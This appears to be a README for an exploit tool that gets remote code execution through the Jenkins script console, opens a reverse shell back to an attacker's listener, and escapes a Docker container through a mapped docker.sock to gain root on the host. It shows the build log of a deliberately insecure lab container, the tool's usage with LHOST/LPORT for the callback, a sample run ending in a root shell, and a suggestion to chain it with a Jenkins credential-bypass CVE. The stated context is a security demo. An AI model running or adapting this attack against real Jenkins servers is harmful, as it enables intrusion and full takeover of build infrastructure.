# Jenkins

This exploit gives a remote shell on a Jenkins server that is running in a docker container
then it privilege escsalate to root and escape the docker container to provide full root access on the pipeline server.

The inspiration for this code come from the geek lunch session where the PE team migrate to Jenkins and also run docker within docker
in the presentation that makes docker escape and privilege escalation trivial.

## Description

This works because Jenkins script console allow execution of groovy code, so this is not a vuln but a feature that can be exploitet.
Escape docker and get root works because docker.sock is mapped into the container and access to docker.sock is equalent to root access
this is also not a vuln just common sence you not do this from security perspective if you are concern about docker escape and privilege escalation to root.


## Usage

First startup the docker Jenkins container by execute the run.sh script it will run a Jenkins instance where we can demo the exploitation.

```ssh
docker  ./run.sh
Sending build context to Docker daemon   5.12kB
Step 1/10 : FROM jenkins:1.596
 ---> 484633fa05c1
Step 2/10 : USER root
 ---> Using cache
 ---> 718a42ff0ebd
Step 3/10 : RUN apt-get update       && apt-get install -y sudo       && rm -rf /var/lib/apt/lists/*
 ---> Using cache
 ---> 0ecf3d8f2e8e
Step 4/10 : RUN echo "jenkins ALL=NOPASSWD: ALL" >> /etc/sudoers
 ---> Using cache
 ---> 4ba00f02b3a9
Step 5/10 : RUN groupadd docker
 ---> Using cache
 ---> 3323041f311b
Step 6/10 : RUN gpasswd -a jenkins docker
 ---> Using cache
 ---> b9c2516d96a1
Step 7/10 : ADD givemeroot.sh /
 ---> ec1fcf18e958
Step 8/10 : USER jenkins
 ---> Running in 6ac13b7148e3
Removing intermediate container 6ac13b7148e3
 ---> 1c0dc288c304
Step 9/10 : COPY plugins.txt /usr/share/jenkins/plugins.txt
 ---> 4c9420482d9c
Step 10/10 : RUN /usr/local/bin/plugins.sh /usr/share/jenkins/plugins.txt
 ---> Running in 86aba74268d3
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   248  100   248    0     0    369      0 --:--:-- --:--:-- --:--:--   370
100   255  100   255    0     0    232      0  0:00:01  0:00:01 --:--:--   847
100  210k  100  210k    0     0   115k      0  0:00:01  0:00:01 --:--:-- 57.3M
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   254  100   254    0     0    566      0 --:--:-- --:--:-- --:--:--   566
100   261  100   261    0     0    345      0 --:--:-- --:--:-- --:--:--   345
100 2537k  100 2537k    0     0   571k      0  0:00:04  0:00:04 --:--:--  727k
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   240  100   240    0     0    545      0 --:--:-- --:--:-- --:--:--   545
100   247  100   247    0     0    300      0 --:--:-- --:--:-- --:--:--   942
100 1985k  100 1985k    0     0   334k      0  0:00:05  0:00:05 --:--:--  418k
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   254  100   254    0     0    579      0 --:--:-- --:--:-- --:--:--   579
100   260  100   260    0     0    347      0 --:--:-- --:--:-- --:--:--  2500
100  108k  100  108k    0     0  90333      0  0:00:01  0:00:01 --:--:-- 90333
Removing intermediate container 86aba74268d3
 ---> 9524555a4829
Successfully built 9524555a4829
Successfully tagged jenkins:latest
57aeb64742b86d986c59135f61bf6582683ee378605160d0c3e72f07474c3866
```

Once the Jenkins container is running we can run the exploitation, here is the usage menu.

```ssh
./jenkins_sconsole_rce.py

 ▐▄▄▄▄▄▄ . ▐ ▄ ▄ •▄ ▪   ▐ ▄ .▄▄ ·  ▄▄·        ▐ ▄ .▄▄ ·       ▄▄▌  ▄▄▄ .▄▄▄   ▄▄· ▄▄▄ .
  ·██▀▄.▀·•█▌▐██▌▄▌▪██ •█▌▐█▐█ ▀. ▐█ ▌▪▪     •█▌▐█▐█ ▀. ▪     ██•  ▀▄.▀·▀▄ █·▐█ ▌▪▀▄.▀·
▪▄ ██▐▀▀▪▄▐█▐▐▌▐▀▀▄·▐█·▐█▐▐▌▄▀▀▀█▄██ ▄▄ ▄█▀▄ ▐█▐▐▌▄▀▀▀█▄ ▄█▀▄ ██▪  ▐▀▀▪▄▐▀▀▄ ██ ▄▄▐▀▀▪▄
▐▌▐█▌▐█▄▄▌██▐█▌▐█.█▌▐█▌██▐█▌▐█▄▪▐█▐███▌▐█▌.▐▌██▐█▌▐█▄▪▐█▐█▌.▐▌▐█▌▐▌▐█▄▄▌▐█•█▌▐███▌▐█▄▄▌
 ▀▀▀• ▀▀▀ ▀▀ █▪·▀  ▀▀▀▀▀▀ █▪ ▀▀▀▀ ·▀▀▀  ▀█▄▀▪▀▀ █▪ ▀▀▀▀  ▀█▄▀▪.▀▀▀  ▀▀▀ .▀  ▀·▀▀▀  ▀▀▀
[mikael.kall@kindredgroup.com]

Usage: ./jenkins_sconsole_rce.py <URL> <LHOST> <LPORT> <USERNAME> <PASSWORD>

EXAMPLE: ./jenkins_sconsole_rce.py 'http://127.0.0.1:8080' 10.100.12.xx 1337 <USERNAME> <PASSWORD>

```

Exploit do a reverse_tcp connection so you need to specify your ip and port to your computer for exploit to connect back to
your listener.

```ssh
jenkins  ./jenkins_sconsole_rce.py 'http://127.0.0.1:8080' 10.100.12.41 1337 admin admin
[+] LHOST = 10.100.12.41
[+] LPORT = 1337
[+] Shell listen
[+] HTTP Listen = 8000
172.17.0.2 - - [15/Jun/2018 09:37:21] "GET /5 HTTP/1.1" 200 -
sh-4.4# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4,6,10,11(ftp),20,26(proc),27
```

You now have remote shell on the Jenkins instance and escaped the docker container and got root access on the target machine.

Note that username and password is not required on this demo password authentication is disabled on the container but if you run
on another instance then it may be required or need to be chained with the credentials bypass CVE in Jenkins that you can find upstream.